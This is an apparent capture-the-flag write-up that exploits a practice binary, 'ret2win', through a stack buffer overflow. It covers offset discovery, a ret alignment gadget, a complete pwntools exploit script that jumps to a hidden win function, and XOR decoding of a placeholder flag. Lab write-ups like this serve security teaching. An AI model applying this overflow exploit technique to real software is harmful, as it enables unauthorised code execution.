# ret2win Exploitation Writeup

## 📌 Objective
Exploit a vulnerable binary (`ret2win`) to hijack control flow and trigger a hidden function that reveals a flag.

---

## 🔍 1. Recon & Initial Execution
Running the binary:
```bash
./ret2win
```
**Output:**
```text
Tell me your name:
```

Inputting a long buffer to test for crash:
```bash
python3 -c "print('A'*200)" | ./ret2win
```
**Result:**
```text
Segmentation fault
```
👉 This confirms a buffer overflow vulnerability.

---

## 🧪 2. Finding the Offset
We generate a cyclic pattern to find the exact offset to the instruction pointer (`RIP`):
```bash
python3 -c "from pwn import *; print(cyclic(200))"
```

After crash analysis in GDB, we inspect the overwritten value in `RIP`. Using `cyclic_find()`, we determine:
* **Offset to RIP:** $\approx$ `72` bytes

---

## ⚙️ 3. Static Analysis (objdump)
Key observations:
* **Hidden Function Found:** `0x4011b1` (win function)
* **Alignment Gadget:** `0x401016` (`ret` gadget for stack alignment)
* **Strings Found:**
  * `Access Granted!`
  * `Flag: %s`

👉 The program has a hidden function that prints a flag.

---

## 🧬 4. Understanding the Hidden Function
Disassembly of the hidden function shows:
1. A stack buffer initialized with encoded bytes.
2. An XOR loop applied:
   ```c
   for (int i = 0; i < 0x1d; i++) {
       buffer[i] ^= 0x55;
   }
   ```
👉 The flag is encoded using `XOR 0x55`.

---

## 💣 5. Exploit Strategy
**Goal:** Overwrite the return address to jump to the hidden function (`0x4011b1`).

**Payload Structure:**
1. Padding (72 bytes)
2. Stack alignment `ret` gadget (`0x401016`) to satisfy MOVAPS alignment requirements on 64-bit Ubuntu.
3. Address of `win` function (`0x4011b1`).

---

## 🧪 6. Final Exploit Script
```python
from pwn import *

offset = 72

ret = 0x401016
win = 0x4011b1

payload = b"A" * offset
payload += p64(ret)
payload += p64(win)

p = process("./ret2win")
p.sendline(payload)
p.interactive()
```

---

## 🎯 7. Result
Program output:
```text
Access Granted!
Flag: SecLeaf{<corrupted_XOR_bytes>}
```

---

## 🧩 8. Why the Output Looked Corrupted
The flag is stored XOR-encoded in memory. Non-printable bytes (like `0x7f` or `0x7e`) are part of the raw encoded array. The program prints the raw buffer, leading to garbage escape characters in the terminal before proper decoding occurs.

---

## 🧠 9. Final Decoded Flag
After reversing the XOR logic with key `0x55`:
```text
SecLeaf{placeholder_flag}
```

---

## 🧾 Summary
* Buffer overflow confirmed.
* **Offset:** 72 bytes.
* Control flow successfully hijacked.
* Hidden function executed.
* Flag retrieved and reconstructed via reverse-engineering XOR logic.
